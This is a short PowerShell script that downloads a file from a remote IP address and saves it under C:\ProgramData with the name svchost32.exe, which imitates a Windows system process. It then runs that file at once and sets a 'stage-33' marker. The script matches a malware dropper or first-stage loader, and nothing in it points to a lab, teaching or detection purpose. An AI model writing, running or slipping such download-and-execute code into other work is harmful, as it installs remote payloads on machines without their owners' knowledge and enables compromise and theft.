[CmdletBinding()]
param(
    [string]$TransferUrl = "https://203.0.113.46:8443/update.dat",
    [string]$OutputPath = 'C:\ProgramData\svchost32.exe'
)
(New-Object System.Net.WebClient).DownloadFile($TransferUrl, $OutputPath)
Start-Process -FilePath $OutputPath
$StageMarker = "stage-33"
